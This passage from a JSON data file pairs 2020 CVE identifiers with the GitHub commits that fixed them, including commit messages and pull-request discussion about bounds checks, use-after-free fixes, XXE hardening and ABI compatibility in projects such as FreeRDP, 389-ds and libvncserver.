input strings. Sounds good to me. Thanks for the patch and for iterating on it.",
            "pr_title_words": 7,
            "comments_words": 292,
            "total_other_info_words": 299
        },
        {
            "cve-id": "CVE-2020-7105",
            "commit_url": "https://github.com/redis/hiredis/commit/70e73a31ad5edb6c457658c0a0b6752b06cc6a25",
            "commit_msg": "Rename allocation wrappers and add license info\n\nSee #752, #747",
            "commit_msg_words": 10,
            "other_info": "Safe allocation wrappers Just quoting the [last parts of the conversation in a merged PR](https://github.com/redis/hiredis/pull/752#issuecomment-577429138) from @michael-grunder \r\n\r\n>  @lamby I totally understand not wanting such a huge change just for a patch.\r\n\r\nThanks... and I think the changes in this PR would work for me. :+1:  Would be great to get some more eyes on this. :) > are we using asprintf and friends anywhere?\r\n\r\nNo, but `sds` has something similar (e.g. [sdscatfmt](https://github.com/redis/hiredis/blob/0501c623c91344e54cb2775a91509650960789b1/sds.c#L582)) although it appears that we're testing for NULL after every allocation/reallocation. \r\n\r\n Merged, thanks everyone!",
            "pr_title_words": 3,
            "comments_words": 84,
            "total_other_info_words": 87
        },
        {
            "cve-id": "CVE-2020-5395",
            "commit_url": "https://github.com/fontforge/fontforge/commit/8da6d56bf7af2d25f779e52edef61b2fd4557b3c",
            "commit_msg": "Fix for #4084 Use-after-free (heap) in the SFD_GetFontMetaData() function\nFix for #4086 NULL pointer dereference in the SFDGetSpiros() function\nFix for #4088 NULL pointer dereference in the SFD_AssignLookups() function\nAdd empty sf->fontname string if it isn't set, fixing #4089 #4090 and many\n  other potential issues (many downstream calls to strlen() on the value).",
            "commit_msg_words": 53,
            "other_info": "Misc CVE fixes You guys played really hard-to-get on this one!\r\n @frank-trampe These sorta feel less like maintenance than gamification.  It's all the rage these days.",
            "pr_title_words": 3,
            "comments_words": 23,
            "total_other_info_words": 26
        },
        {
            "cve-id": "CVE-2020-11525",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/58dc36b3c883fd460199cedb6d30e58eba58298c",
            "commit_msg": "Fixed possible NULL dereference",
            "commit_msg_words": 4,
            "other_info": "Fix issues with boundary access. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4756/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4757/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4758/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4759/\n @hardening will address your comments in a separate PR, I think better merge this now as it is already big enough. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4766/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4767/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4768/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4769/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4770/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4771/",
            "pr_title_words": 5,
            "comments_words": 161,
            "total_other_info_words": 166
        },
        {
            "cve-id": "CVE-2020-15350",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/f8ac003bbfe11956578dd2189827686c27374d06",
            "commit_msg": "base64: Fixed decode buffer size estimation\n\nFixed required result buffer size underestimation in base64_estimate_decode_size() function.",
            "commit_msg_words": 15,
            "other_info": "sys/base64: Fix, unit test cleanup, and benchmark Somehow the build was previously not queued, toggling `CI: ready for build` seems to have solved the issue. Looks like the unit test will now fail\r\n\r\n> `base64_tests.test_base64_13_size_estimation (tests/unittests/tests-base64/tests-base64.c 495) exp 3 was 0` No need to run tests on hardware. The compilation tests include a run of the unit tests on the `native` board. @mjurczak: I cherry-picked your suggested fix and included it in the PR. This way, the credit for and authorship of the commits stays with you. With @mjurczak fix included, the unit tests are now passing. I updated the PR title and the description accordingly. Fixed some style issues, while we're at it.\r\n\r\n(I will let Murdock run again when I have squashed.) > Should the benchmark have an automatic test?\r\n\r\nI'm not sure what an automatic test should do. A single benchmark run will provide a raw number, that lacks context. (Or two raw numbers, one for encode and one for decode.) IMO, at least a second benchmark result from the same hardware is needed to have any meaningful information.\r\n\r\nWhat we could do (if we want to run automatic tests), is to feed a database with the raw results to see how performance changes over time. But maybe such considerations should be done independently form this PR and applied later on to all benchmarks. > I'm not sure what an automatic test should do. A single benchmark run will provide a raw number, that lacks context. (Or two raw numbers, one for encode and one for decode.) IMO, at least a second benchmark result from the same hardware is needed to have any meaningful information.\r\n> \r\n> What we could do (if we want to run automatic tests), is to feed a database with the raw results to see how performance changes over time. But maybe such considerations should be done independently form this PR and applied later on to all benchmarks.\r\n\r\nI was just thinking on the most basic check, what we do for other benches `tests/bench_xtimer/tests/01-run.py`, just a simple test that says \"the application works\". My comment comes mainly from the impression that we now ask for a `01-run.py` for new applications. > I was just thinking on the most basic check, what we do for other benches `tests/bench_xtimer/tests/01-run.py`, just a simple test that says \"the application works\".\r\n\r\nAh, OK! I added the test. Please squash @maribu and re-trigger ci. I fixed a typo in the test input detected by the static tests (and the corresponding base64) and added the missing empty line flake8 complained about. I squashed right away. Murdock likes it too. @mjurczak: Thank you very much for reporting and fixing the issue!\r\n\r\nThanks everyone for the reviews. @maribu  I'm stunned with the fast reaction. Great job everyone!",
            "pr_title_words": 7,
            "comments_words": 458,
            "total_other_info_words": 465
        },
        {
            "cve-id": "CVE-2020-35518",
            "commit_url": "https://github.com/389ds/389-ds-base/commit/cc0f69283abc082488824702dae485b8eae938bc",
            "commit_msg": "Issue 4480 - Unexpected info returned to ldap request (#4491)\n\nBug description:\r\n\tIf the bind entry does not exist, the bind result info\r\n        reports that 'No such entry'. It should not give any\r\n        information if the target entry exists or not\r\n\r\nFix description:\r\n\tDoes not return any additional information during a bind\r\n\r\nrelates: https://github.com/389ds/389-ds-base/issues/4480\r\n\r\nReviewed by: William Brown, Viktor Ashirov, Mark Reynolds (thank you all)\r\n\r\nPlatforms tested:  F31",
            "commit_msg_words": 68,
            "other_info": "Issue 4480 - Unexpected info returned to ldap request I see nothing wrong with the code and the patch here, that's all good to me. I just thing this is solving a problem that doesn't exist, and in exchange makes it harder for an admin or user to identify if they have made a mistake in their command by removing the difference between \"wrong pw\" and \"no such dn\".\r\n\r\nKnowledge of if an entry/dn exists or not, does *not* create a risk, as in most deployments anonymous bind and read is enabled by default. If you really wanted to be pedantic you could even do timing attacks to work out if this existed or not, because it's effectively impossible to do constant time search/responses. \r\n\r\nNow, to prove this, here is redhats login page showing the difference between \"account does not exist\" and \"attempt the pw\". \r\n\r\nI think that we should reject this issue, because it's not a security risk, and this pattern is accepted the world over in many authentication systems. \r\n\r\n![Screen Shot 2020-12-11 at 10 50 56](https://user-images.githubusercontent.com/271005/101847413-eb17a900-3b9e-11eb-8206-163891d6bd9a.png)\r\n\r\n![Screen Shot 2020-12-11 at 10 51 07](https://user-images.githubusercontent.com/271005/101847408-e94de580-3b9e-11eb-853f-bbdd586ef3a7.png)\r\n Just to really nail this one shut, here is google exhibiting the same behaviour - google who is a huge security target, and hires some of the best security people in the world, and they have a ui that says if the account exists or does not.\r\n\r\nAs a result, I really firmly believe this is a non issue and should be closed/rejected. \r\n\r\n![Screen Shot 2020-12-11 at 10 56 04](https://user-images.githubusercontent.com/271005/101847712-958fcc00-3b9f-11eb-9a37-61aba332d715.png)\r\n There was a [CVE](https://bugzilla.redhat.com/show_bug.cgi?id=1347760) that was fixed 4 years ago. Recently it was reintroduced. So this PR fixes this regression. \r\n\r\n> Now, to prove this, here is redhats login page showing the difference between \"account does not exist\" and \"attempt the pw\".\r\n\r\nHere's a SUSE login page that **doesn't show** a difference between \"account does not exist\" and \"attempt the pw\"\r\n\r\n(yes, I actually went and created an account)\r\n![image](https://user-images.githubusercontent.com/1745018/101887202-d0dccb80-3b9c-11eb-83f4-f0775fed79d7.png)\r\n![image](https://user-images.githubusercontent.com/1745018/101887362-0aadd200-3b9d-11eb-97bf-8c13d8c70f87.png)\r\n\r\n\r\n> google who is a huge security target, and hires some of the best security people in the world, and they have a ui that says if the account exists or does not.\r\n\r\nI think it is a faulty generalization and this argument should be rejected :) I have not strong opinion whether it is security concern or not to return some internal information.\r\nBut [CVE-2016-4992](https://bugzilla.redhat.com/show_bug.cgi?id=1347760) resulted into a big investigation and [fix](https://github.com/389ds/389-ds-base/commit/0b932d4b926d46ac5060f02617330dc444e06da1).\r\nPart of that fix was to send \"generic\" ldap result and log \"specific\" info in access logs when the information can be sensitive.\r\n\r\nThis part of the fix got broken by a recent [change](https://github.com/389ds/389-ds-base/commit/94c74015e529c08d59cc3e856199888867bd6449). I think it got broken by mistake. The intention was to return notification to a client that a [ldbm tuning moved to bdb](https://github.com/389ds/389-ds-base/blob/master/ldap/servers/slapd/back-ldbm/ldbm_config.c#L1246). For this it uses SLAPI_PB_RESULT_TEXT in the pblock and send it back during result. \r\n\r\nThe problem being that CVE-2016-4992 used that field to **only** record info in access logs.\r\nThe my original patch is too limited. #49476 changed CVE fix regarding all operations (ADD,DEL, BIND...).\r\nI will rework the patch \r\n> > google who is a huge security target, and hires some of the best security people in the world, and they have a ui that says if the account exists or does not.\r\n> \r\n> I think it is a faulty generalization and this argument should be rejected :)\r\n\r\nIt should never have been a CVE in the first place because there is provably *zero risk* in this behaviour existing. Just because SUSE \"agrees\" with the behaviour, does not discount that both rh/google allow it. It's not a faulty generalisation. \r\n\r\n\r\n> \r\n> This part of the fix got broken by a recent [change](https://github.com/389ds/389-ds-base/commit/94c74015e529c08d59cc3e856199888867bd6449). I think it got broken by mistake. The intention was to return notification to a client that a [ldbm tuning moved to bdb](https://github.com/389ds/389-ds-base/blob/master/ldap/servers/slapd/back-ldbm/ldbm_config.c#L1246). For this it uses SLAPI_PB_RESULT_TEXT in the pblock and send it back during result.\r\n> \r\n> The problem being that CVE-2016-4992 used that field to **only** record info in access logs.\r\n> The my original patch is too limited. #49476 changed CVE fix regarding all operations (ADD,DEL, BIND...).\r\n> I will rework the patch\r\n\r\nI think it should be a tunable setting, and off by default - if customers want to \"believe\" this is a security risk and lower usability at the same time, they should have to enable it.  Updated patch to cover all operations",
            "pr_title_words": 9,
            "comments_words": 720,
            "total_other_info_words": 729
        },
        {
            "cve-id": "CVE-2020-15166",
            "commit_url": "https://github.com/zeromq/libzmq/commit/e7f0090b161ce6344f6bd35009816a925c070b09",
            "commit_msg": "problem: zeromq connects peer before handshake is completed\n\nSolution: delay connecting the peer pipe until the handshake is completed",
            "commit_msg_words": 19,
            "other_info": "problem: zeromq connects peer before handshake is complete @bluca PR is ready  Thanks!",
            "pr_title_words": 8,
            "comments_words": 5,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2020-22219",
            "commit_url": "https://github.com/xiph/flac/commit/5a79fb5ce99b4fb7ba01b4ea85a0e5911e82b243",
            "commit_msg": "Add checks that supplied samples are bounded within bits-per-sample\n\nCredit: Oss-Fuzz\nIssue: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=19758\nIssue: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=31727",
            "commit_msg_words": 15,
            "other_info": "Fix 2 encoder bugs found by oss-fuzz It turns out in the past, invalid files have been created in which the samples exceed the range offered by the stated bit depth, see https://sourceforge.net/p/flac/bugs/468/ This PR prevents the encoder from creating such files.",
            "pr_title_words": 7,
            "comments_words": 35,
            "total_other_info_words": 42
        },
        {
            "cve-id": "CVE-2020-36640",
            "commit_url": "https://github.com/bonitasoft/bonita-connector-webservice/commit/a12ad691c05af19e9061d7949b6b828ce48815d5",
            "commit_msg": "fix(vulnerabilities): fix XXE attacks vulnerabilities and other code smell (#17)\n\n* Access to external entities and network access should always be\r\ndisable to avoid XXS attacks vulnerabilities.\r\n* Log error properly\r\n* refactor logger name to be compliant with java naming conventions",
            "commit_msg_words": 42,
            "other_info": "fix(vulnerabilities): fix XXE attacks vulnerabilities and other code smell SonarCloud Quality Gate failed.\n\n[<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug.png' alt='Bug' width='16' height='16' />](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=BUG) [<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A.png' alt='A' width='16' height='16' />](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=BUG)  \n[<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability.png' alt='Vulnerability' width='16' height='16' />](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=VULNERABILITY) [<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A.png' alt='A' width='16' height='16' />](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=VULNERABILITY) (and [<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot.png' alt='Security Hotspot' width='16' height='16' />](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=SECURITY_HOTSPOT) to review)  \n[<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell.png' alt='Code Smell' width='16' height='16' />](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=CODE_SMELL) [<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A.png' alt='A' width='16' height='16' />](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=CODE_SMELL) [0 Code Smells](https://sonarcloud.io/project/issues?id=bonitasoft_bonita-connector-webservice&pullRequest=17&resolved=false&types=CODE_SMELL)\n\n[<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/60.png' alt='68.8%' width='16' height='16' />](https://sonarcloud.io/component_measures?id=bonitasoft_bonita-connector-webservice&pullRequest=17&metric=new_coverage&view=list) [68.8% Coverage](https://sonarcloud.io/component_measures?id=bonitasoft_bonita-connector-webservice&pullRequest=17&metric=new_coverage&view=list)  \n[<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3.png' alt='0.0%' width='16' height='16' />](https://sonarcloud.io/component_measures?id=bonitasoft_bonita-connector-webservice&pullRequest=17&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=bonitasoft_bonita-connector-webservice&pullRequest=17&metric=new_duplicated_lines_density&view=list)\n\n<img src='https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/message_warning.png' alt='warning' width='16' height='16' /> The version of Java (1.8.0_265) you have used to run this analysis is deprecated and we will stop accepting it from October 2020. Please update to at least Java 11.\nRead more [here](https://sonarcloud.io/documentation/upcoming/)",
            "pr_title_words": 9,
            "comments_words": 116,
            "total_other_info_words": 125
        },
        {
            "cve-id": "CVE-2020-14147",
            "commit_url": "https://github.com/redis/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571",
            "commit_msg": "[FIX] revisit CVE-2015-8080 vulnerability",
            "commit_msg_words": 4,
            "other_info": "[FIX] revisit CVE-2015-8080 vulnerability Thanks! I'm backporting the fix in the Redis 5 branch.",
            "pr_title_words": 4,
            "comments_words": 10,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2020-36277",
            "commit_url": "https://github.com/DanBloomberg/leptonica/commit/3ddd9a35cebc28f2b1a5693c27dcfff58218674a",
            "commit_msg": "Fix heap buffer overflow in selReadStream\n\nselio_reg triggers a heap buffer overflow when sscanf tries to write 201 bytes into a 24 byte string.\nIt can be detected when the code is compiled with the address sanitizer:\n\n    ==19856==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000001288 at pc 0x00000044462b bp 0x7fffffffddf0 sp 0x7fffffffd5a0\n    WRITE of size 201 at 0x603000001288 thread T0\n    0x603000001288 is located 0 bytes to the right of 24-byte region [0x603000001270,0x603000001288)\n\nSigned-off-by: Stefan Weil <sw@weilnetz.de>",
            "commit_msg_words": 74,
            "other_info": "Fix heap buffer overflow in selReadStream (detected by clang address sanitizer) The fix for tiffio breaks `pixcomp_reg`, therefore this needs separate examination. I'll remove that commit from the pull request. I found and fixed the int32 --> uint32 issue before reading your PR.\r\n\r\nThank you for this, and for fixing the selname issue.\r\n\r\nSeems I can't merge because of a build issue The build issue on Ubuntu looks unrelated to this pull request. @egorpugin, can you help, please? Ignore it. Error is unrelated to leptonica. It's on sw side, I'll check. Should be ok now. I just realized this was waiting.\r\nThank you.",
            "pr_title_words": 11,
            "comments_words": 92,
            "total_other_info_words": 103
        },
        {
            "cve-id": "CVE-2020-10378",
            "commit_url": "https://github.com/python-pillow/Pillow/commit/6a83e4324738bb0452fbe8074a995b1c73f08de7",
            "commit_msg": "Fix OOB Access on PcxDecode.c",
            "commit_msg_words": 5,
            "other_info": "Fix bounds overflow in PCX decoding",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2020-11940",
            "commit_url": "https://github.com/ntop/nDPI/commit/3bbb0cd3296023f6f922c71d21a1c374d2b0a435",
            "commit_msg": "ssh: adds systematic bounds checks in concat_hash_string\n\ncf GHSL-2020-052",
            "commit_msg_words": 9,
            "other_info": "Ghsl 2020 05x Thank you",
            "pr_title_words": 3,
            "comments_words": 2,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2020-8443",
            "commit_url": "https://github.com/ossec/ossec-hids/commit/353ef15e4d3c5dfa8f1cc100651656cf7013c6a9",
            "commit_msg": "analysisd: fix off-by-one in OS_CleanMSG.\n\nWhen removing the '[ID xx facility.severity]' substring of a syslog\nmessage in `OS_CleanMSG` care needs to be taken to stay within the\nbounds of the msg buffer when advancing past the `] ` in the msg.\n\nPrev. to this commit the `pieces` pointer is incremented by 2 when there\nmay be only 1 character remaining before the null terminator.",
            "commit_msg_words": 64,
            "other_info": "analysisd: fix off-by-one in OS_CleanMSG.",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2020-12278",
            "commit_url": "https://github.com/libgit2/libgit2/commit/e1832eb20a7089f6383cfce474f213157f5300cb",
            "commit_msg": "path: also guard `.gitmodules` against NTFS Alternate Data Streams\n\nWe just safe-guarded `.git` against NTFS Alternate Data Stream-related\nattack vectors, and now it is time to do the same for `.gitmodules`.\n\nNote: In the added regression test, we refrain from verifying all kinds\nof variations between short names and NTFS Alternate Data Streams: as\nthe new code disallows _all_ Alternate Data Streams of `.gitmodules`, it\nis enough to test one in order to know that all of them are guarded\nagainst.\n\nSigned-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>",
            "commit_msg_words": 85,
            "other_info": "Security fixes for master",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2020-27743",
            "commit_url": "https://github.com/kravietz/pam_tacplus/commit/bceaab0cd51a09b88f40f19da799ac7390264bf8",
            "commit_msg": "pam_tacplus.c: Fallback to using PID as task ID\n\nIf there is a failure obtaining a random task ID for the session\naccounting request then fallback to using the PID, as this is unique\nfor the lifetime of the PAM application and therefore session.",
            "commit_msg_words": 43,
            "other_info": "Check for failure of OpenSSL RAND_[pseudo_]bytes LGTM I have requested allocation of a CVE ID from MITRE. Thanks, when we have CVE we can bump version and publish a new release. CVE-2020-27743 was assigned for this issue. Can you review/edit https://github.com/kravietz/pam_tacplus/security/advisories/GHSA-rp3p-jm35-jv76 Thanks all for progressing this while I was AFK. @kravietz, @deastoe looking the commit history of the project it looks that the issue only is introduced after 6fac2504657b8d98fcd627d60ebdbffcf0253b81 in v1.5.0-beta.1. If this is correct maybe in GHSA-rp3p-jm35-jv76 that could be added to the 'affected versions' constraints. @carnil , that's correct. Updated the advisory: \"after v1.5.0, before v1.6.1\" @gollub: Thanks! @carnil, @gollub, I believe this also affects v1.4.1: https://github.com/kravietz/pam_tacplus/blob/8dddbec2940f99fa4867d6b6a92d8ba10206915e/libtac/lib/header.c#L93\r\nI will update the advisory.\r\n\r\nIn fact, it looks like v1.4.1 also does not check for a failure of getrandom(). This was fixed in v1.5.1 (d5ea51ff6a9b74bdc8a9ea7e6758d520f9b9a9fa) > In fact, it looks like v1.4.1 also does not check for a failure of getrandom().\r\n\r\nHowever in 1.4.1 getrandom() is only used when not built with libcrypto, and 1.4.1 cannot be built out-of-the-box _without_ libcrypto.",
            "pr_title_words": 6,
            "comments_words": 165,
            "total_other_info_words": 171
        },
        {
            "cve-id": "CVE-2020-36434",
            "commit_url": "https://github.com/FillZpp/sys-info-rs/commit/4fda8b6a5ffbea03d05fcfc0a89594e6ca495fc7",
            "commit_msg": "Make Disk Info Thread-Safe on Linux",
            "commit_msg_words": 6,
            "other_info": "Make Disk Info Thread-Safe on Linux",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2020-11086",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/c098f21fdaadca57ff649eee1674f6cc321a2ec4",
            "commit_msg": "Fixed oob read in ntlm_read_ntlm_v2_response",
            "commit_msg_words": 5,
            "other_info": "Stable backports \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4912/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4913/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4916/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4918/\n @akallabeth In `ntlm_read_ntlm_v2_client_challenge()`, why `if (Stream_GetRemainingLength(s) < 28)` ? The code looks like it actually reads 112 bytes from the stream. Am I missing something? @tcullum-rh No, the check is correct. `28` bytes are read in and the remaining length copied to `NTLM_AV_PAIR` @akallabeth ah I misunderstood the calls as \"8 UINTs\" instead of \"1 byte\". Thanks for clarifying, your response, and all the hard work!",
            "pr_title_words": 2,
            "comments_words": 122,
            "total_other_info_words": 124
        },
        {
            "cve-id": "CVE-2020-27828",
            "commit_url": "https://github.com/jasper-software/jasper/commit/4cd52b5daac62b00a0a328451544807ddecf775f",
            "commit_msg": "Avoid maxrlvls more than upper bound to cause heap-buffer-overflow",
            "commit_msg_words": 9,
            "other_info": "Avoid maxrlvls more than upper bound to cause heap-buffer-overflow This PR fixes https://github.com/jasper-software/jasper/issues/252.",
            "pr_title_words": 9,
            "comments_words": 4,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2020-15569",
            "commit_url": "https://github.com/milkytracker/MilkyTracker/commit/7afd55c42ad80d01a339197a2d8b5461d214edaf",
            "commit_msg": "Fix use-after-free in PlayerGeneric destructor",
            "commit_msg_words": 5,
            "other_info": "Fix some milkyplay bugs/crashes Hi exelotl,\r\n\r\nThanks for your PR and excellent write up.  Milkyplay has been used outside of Milkytracker for a few projects but mostly it's been developed to support Milkytracker.\r\n\r\nDo you mind if I include your example code?  It could be useful for someone else in the future.\r\n Sure, you can use that code wherever, no problem!\r\n\r\nOne of the reasons I've been working with milkyplay is because I'd love to have a tracker running on the 3DS. However a direct port of MilkyTracker isn't quite what I'm after - I used NitroTracker on my DS many years ago and I think they absolutely *nailed* the user interface, so I'd like to try and replicate that where possible.\r\n\r\nI did manage to get a [3DS audiodriver](https://github.com/exelotl/MilkyTracker/tree/audiodriver-3ds/src/milkyplay/drivers/3ds) working. But I think what I had in mind is weeks or months of work, and I have a lot of other things on my plate right now. Ah well, maybe it's something I can pick up in the future...",
            "pr_title_words": 4,
            "comments_words": 166,
            "total_other_info_words": 170
        },
        {
            "cve-id": "CVE-2020-14398",
            "commit_url": "https://github.com/LibVNC/libvncserver/commit/57433015f856cc12753378254ce4f1c78f5d9c7b",
            "commit_msg": "libvncclient: handle half-open TCP connections\n\nWhen a connection is not reset properly at the TCP level (e.g. sudden\npower loss or process crash) the TCP connection becomes half-open and\nread() always returns -1 with errno = EAGAIN while select() always\nreturns 0. This leads to an infinite loop and can be fixed by closing\nthe connection after a certain number of retries (based on a timeout)\nhas been exceeded.",
            "commit_msg_words": 69,
            "other_info": "libvncclient: handle half-open TCP connections (looks like AppVeyor failed because of libpng download error/server timeout and not an actual code issue) I notice some Linux distros are backporting this patch because it fixes [CVE-2020-14398](https://nvd.nist.gov/vuln/detail/CVE-2020-14398). However, this modifies the size of the rfbClient struct, which is public ABI. Accordingly, this patch is not suitable for backport unless dependent packages are rebuilt.\r\n\r\nWe need to be *very* careful with libvncserver because it isn't maintaining library soname properly; i.e. different releases of the library with the same soname actually contain ABI changes. @mcatanzaro please note that we're (now) very careful to just be _adding to the end_ of the rfbClient struct, not removing members, not adding in between in order to preserver ABI compat. Thus, this patch is indeed suitable for backports. Hi @bk138, since this struct is public and likely to be allocated on the stack, I think you need to remove padding bytes from the end of the struct if you want to avoid breaking the ABI, yes? Unfortunately there is no padding here.\r\n\r\nIf #420 is implemented, this problem will go away. > Hi @bk138, since this struct is public and likely to be allocated on the stack, I think you need to remove padding bytes from the end of the struct if you want to avoid breaking the ABI, yes? Unfortunately there is no padding here.\r\n\r\nIt's always (at least that's the API) allocated on the heap, so the \"internals\" must be at the right place, but it doesn't do harm if it contains more members than expected its end. \r\n\r\n> If #420 is implemented, this problem will go away.\r\n\r\nNot really, as struct members will still be there?\r\n\r\n > It's always (at least that's the API) allocated on the heap, so the \"internals\" must be at the right place, but it doesn't do harm if it contains more members than expected its end.\r\n\r\nEr... if the entire struct is declared in a public header, how can you guarantee it is always allocated on the heap? Example failure case is:\r\n\r\n```\r\nrfbClient client;\r\nrfbInitClient(&client, argc, argv);\r\n```\r\n\r\nIf the application is compiled against older libvncserver but run against new libvncserver, then boom! you've clobbered whatever is next on the stack.\r\n\r\nNow I see that all of your example code uses rfbGetClient() to allocate the rfbClient. Hm, OK, so everything that uses that will all be fine, and I guess realistic applications are supposed to do that? Looking at the implementation of rfbGetClient(), I guess so, since that seems like a lot of work to configure it properly otherwise. But it still violates the normal rules distros expect for ABI stability, and it's probably(?) going to be caught by distro ABI checkers, and will likely result in downstreams refusing to take the patch regardless. So if you want to be able to add new members to a public struct, then please only declare the struct in a header file, and define it only in a source file such that its data members are all private, and provide getter/setter functions for whatever fields need to be accessible. Then there's no question that it's safe.\r\n\r\n> Not really, as struct members will still be there?\r\n\r\nIf the struct members are no longer public (I assume that's what is intended by \"sealed\") and the struct can no longer be allocated on the stack, then you can change whatever you want whenever you want without breaking ABI. Otherwise, you're going to scare downstreams like me. At least, I fear a struct size change more than I do denial of service. > Now I see that all of your example code uses rfbGetClient() to allocate the rfbClient. Hm, OK, so everything that uses that will all be fine, and I guess realistic applications are supposed to do that? Looking at the implementation of rfbGetClient(), I guess so, since that seems like a lot of work to configure it properly otherwise. But it still violates the normal rules distros expect for ABI stability, and it's probably(?) going to be caught by distro ABI checkers, and will likely result in downstreams refusing to take the patch regardless. So if you want to be able to add new members to a public struct, then please only declare the struct in a header file, and define it only in a source file such that its data members are all private, and provide getter/setter functions for whatever fields need to be accessible. Then there's no question that it's safe.\r\n\r\nWould love to have this. This is more or less what #420 is about. \r\n\r\n> \r\n> > Not really, as struct members will still be there?\r\n> \r\n> If the struct members are no longer public (I assume that's what is intended by \"sealed\") and the struct can no longer be allocated on the stack, then you can change whatever you want whenever you want without breaking ABI. Otherwise, you're going to scare downstreams like me. At least, I fear a struct size change more than I do denial of service.\r\n\r\nSorry for scaring you, not my intention nor the original author's one, I guess. Let me propose #181 as a stop-gap solution.",
            "pr_title_words": 5,
            "comments_words": 857,
            "total_other_info_words": 862
        },
        {
            "cve-id": "CVE-2020-13991",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/7d64ec68d7827ea634e2bdc89fdac0b5662cfe4b",
            "commit_msg": "Correct release of spread arguments\n\nDuring the `opfunc_spread_arguments` argument release process\nthe stack pointer was incremented early resulting in a state where\none of the arguments was not freed causing a memory leak.\n\nJerryScript-DCO-1.0-Signed-off-by: Peter Gal pgal.usz@partner.samsung.com",
            "commit_msg_words": 37,
            "other_info": "Correct release of spread arguments",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2020-23321",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/0044a35188e5275194597a6f0e076b1faa2f0d86",
            "commit_msg": "Add missing end-of-string checks to RegExp parser in unicode mode\n\nFixes #3870.\nFixes #3871.\n\nJerryScript-DCO-1.0-Signed-off-by: D\u00e1niel B\u00e1tyai dbatyai@inf.u-szeged.hu",
            "commit_msg_words": 18,
            "other_info": "Add missing end-of-string checks to RegExp parser in unicode mode",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2020-10062",
            "commit_url": "https://github.com/zephyrproject-rtos/zephyr/commit/11b7a37d9a0b438270421b224221d91929843de4",
